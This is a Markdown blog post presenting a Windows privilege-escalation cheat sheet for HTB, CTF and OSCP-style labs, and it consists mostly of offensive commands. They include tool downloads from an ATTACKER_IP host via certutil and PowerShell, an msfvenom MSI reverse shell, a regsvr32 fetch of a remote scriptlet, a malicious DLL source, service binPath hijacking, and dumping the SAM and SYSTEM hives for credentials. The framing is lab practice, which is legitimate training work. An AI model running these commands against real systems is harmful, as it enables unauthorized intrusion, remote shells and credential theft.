---
layout: post
title: "Windows Privilege Escalation Cheatsheet"
subtitle: "Fast techniques, tools, and commands for HTB, CTFs and OSCP-like environments"
tags: [windows, privesc, escalation, cheatsheet, hacking, htb, ctf]
---

A practical cheat sheet for quick Windows privilege escalation during HTB, CTFs and offensive security labs.

---

# 0. ESSENTIAL PRIVESC RESOURCES & TOOLS

Before manual enumeration, these tools provide fast, high-value information.

## 📌 PrivEsc Tools & Frameworks
- **WinPEAS**: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  
- **Seatbelt**: https://github.com/GhostPack/Seatbelt  
- **SharpUp**: https://github.com/GhostPack/SharpUp  
- **PowerUp** (PowerShell): https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
- **Watson** (Privilege Escalation Checks): https://github.com/rasta-mouse/Watson  
- **JuicyPotato / RoguePotato / PrintSpoofer**  
- **LOLBAS (Living Off the Land Binaries)**: https://lolbas-project.github.io/  
- **PayloadsAllTheThings – Windows PrivEsc**: https://github.com/swisskyrepo/PayloadsAllTheThings  

---

# 0.1 QUICK FILE TRANSFER COMMANDS (upload tools to target)

## Attacker: Host files
```

python3 -m http.server 8000

```

## Victim: Download tools
```

certutil -urlcache -f http://ATTACKER_IP:8000/winPEAS.exe winpeas.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/Seatbelt.exe','Seatbelt.exe')"

certutil -urlcache -f http://ATTACKER_IP:8000/PrintSpoofer.exe PrintSpoofer.exe

```

---

# 1. BASIC ENUMERATION

## System Info
```

systeminfo
hostname
wmic os get Caption,Version,BuildNumber

```

## Users & Groups
```

whoami
whoami /all
net user
net localgroup
net localgroup administrators

```

## Processes
```

tasklist /v
wmic process list brief

```

## Scheduled Tasks
```

schtasks /query /fo LIST /v

```

## Installed programs
```

wmic product get name,version

```

---

# 2. UAC BYPASS CHECKS

Check integrity level:
```

whoami /groups | findstr "High Medium"

```

Check if UAC is disabled:
```

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

```

If allowed, use:
- **eventvwr.exe**
- **fodhelper.exe**
- **sdclt.exe**

Example:
```

fodhelper.exe

```

---

# 3. UNQUOTED SERVICE PATHS

List services:
```

wmic service get name,displayname,pathname,startmode | findstr /i "auto"

```

Check for unquoted space in path:
```

C:\Program Files\Something Service\service.exe

```

Replace the first writable location with a malicious binary:
```

C:\Program.exe
C:\Program Files\Something.exe

```

Restart service:
```

net stop "ServiceName"
net start "ServiceName"

```

---

# 4. WEAK SERVICE PERMISSIONS

List service permissions:
```

sc qc <service>
sc sdshow <service>

```

Check if user can modify service binPath, config, or restart it.

Modify binary path:
```

sc config <service> binPath= "cmd.exe /c C:\reverse.exe"
net start <service>

```

---

# 5. ALWAYSINSTALL ELEVATED (MSI INSTALLER ESCALATION)

Check registry:
```

reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

If both = 1, generate MSI reverse shell:
```

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o exploit.msi

```

Run:
```

msiexec /quiet /qn /i exploit.msi

```

---

# 6. SCHEDULED TASKS ABUSE

List tasks:
```

schtasks /query /fo LIST /v

```

Look for:
- Writable scripts
- Writable working directories
- Actions calling executables without full paths

Modify script → wait for execution.

---

# 7. DLL HIJACKING

Check for missing DLLs:
```

procmon

```

Or search from disk:
```

where /R C:\ *.dll

```

If process loads a DLL from a writable directory:
- Create malicious DLL  
- Place it before real path  
- Restart application  

Minimal malicious DLL:
```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    system("cmd.exe");
    return 0;
}
```

Compile:

```
x86_64-w64-mingw32-gcc exploit.c -shared -o evil.dll
```

---

# 8. ABUSING LOLOBAS BINARIES

Check LOLBAS list:
[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

Examples:

```
certutil -decode payload.b64 reverse.exe
msbuild reverse.xml
regsvr32 /u /s /i:http://ATTACKER_IP/payload.sct scrobj.dll
```

---

# 9. TOKEN IMPERSONATION & PRIVILEGE ABUSE

Check privileges:

```
whoami /priv
```

Dangerous privileges:

* SeImpersonatePrivilege
* SeAssignPrimaryTokenPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeDebugPrivilege

Use:

* **PrintSpoofer**

```
PrintSpoofer.exe -i -c cmd
```

* **RoguePotato / JuicyPotato**
  (works on older systems)

---

# 10. PASSWORD & CREDENTIAL HUNTING

## Search for passwords in files

```
findstr /si password *.txt *.ini *.config *.xml
```

## Saved credentials

```
cmdkey /list
```

## Browser credentials

```
dir "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

## SAM & SYSTEM hives

```
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
```

Extract with impacket-secretsdump.

---

# 11. LAPS MISCONFIGURATION

Check for LAPS attributes:

```
Find-LAPSPasswords
```

Or:

```
Get-ADComputer -Identity <computer> -Properties ms-Mcs-AdmPwd
```

Often yields local admin passwords.

---

# 12. KERNEL & DRIVER EXPLOITS

Check OS version:

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Known exploit families:

* Kernel CVEs
* Driver-based exploits
* Local privilege escalation binaries

Be cautious: may BSOD the system.

---

# 13. AUTOMATED ENUMERATION

## WinPEAS

```
winpeas.exe
```

## PowerUp

```
powershell -exec bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

## Seatbelt

```
Seatbelt.exe all
```

## SharpUp

```
SharpUp.exe
```

---

# Final Notes

This cheat sheet centralizes the key Windows privilege escalation vectors:

* Unquoted service paths
* Weak service permissions
* UAC bypass
* AlwaysInstallElevated
* Scheduled tasks
* DLL hijacking
* Token impersonation
* Credential hunting
* Kernel/driver exploits
* Automated enumeration tools

Suitable for HTB, CTFs, OSCP preparation and controlled lab environments.

---